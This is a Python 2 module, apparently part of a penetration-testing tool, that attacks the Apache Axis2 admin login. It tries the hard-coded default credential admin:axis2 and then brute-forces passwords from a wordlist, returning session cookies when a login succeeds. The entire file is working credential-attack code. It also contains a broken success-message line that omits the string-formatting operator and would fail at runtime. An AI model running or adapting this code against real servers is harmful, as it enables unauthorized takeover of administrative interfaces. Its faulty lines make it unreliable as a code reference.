from requests.utils import dict_from_cookiejar
from log import LOG
from sys import stdout
import state
import utility

default_credentials = [("admin", "axis2")]

def _auth(usr, pswd, url, version):
    """ Currently only auths to the admin interface
    """

    data = { 
             "userName" : usr,
             "password" : pswd,
             "submit" : "+Login+"
           }

    response = utility.requests_post(url, data=data)
    if response.status_code is 200 and not "name=\"password\"" in response.content:
        utility.Msg("Successfully authenticated with %s:%s" % (usr, pswd), LOG.DEBUG)
        return dict_from_cookiejar(response.cookies)
        

def checkAuth(ip, port, title, version):
    """
    """

    url = "http://{0}:{1}/axis2/axis2-admin/login".format(ip, port)

    if state.usr_auth:
        (usr, pswd) = state.usr_auth.split(":")
        return _auth(usr, pswd, url, version)

    # try default creds
    for (usr, pswd) in default_credentials:
        cook = _auth(usr, pswd, url, version)
        if cook:
            return cook

    # bruteforce
    if state.bf_wordlist and not state.hasbf:

        state.hasbf = True
        wordlist = []
        with open(state.bf_wordlist, 'r') as f:
            # ensure its all ascii
            wordlist = [x.decode('ascii', 'ignore').rstrip() for x in f.readlines()]

        utility.Msg("Brute forcing %s account with %d passwords..." %
                        (state.bf_user, len(wordlist)), LOG.DEBUG)

        try:
            for (idx, word) in enumerate(wordlist):
                stdout.flush()
                stdout.write("\r\033[32m [%s] Brute forcing password for %s [%d/%d]\033[0m"\
                                % (utility.timestamp(), state.bf_user,
                                   idx+1, len(wordlist)))

                cook = _auth(state.bf_user, word, url, version)
                if cook:
                    print '' # newline

                    if not (state.bf_user, word) in default_credentials:
                        default_credentials.insert(0, (state.bf_user, word))
                   
                    utility.Msg("Successful login %s:%s"
                                    (state.bf_user, word), LOG.SUCCESS)
                    return cook

            print ''

        except KeyboardInterrupt:
            pass
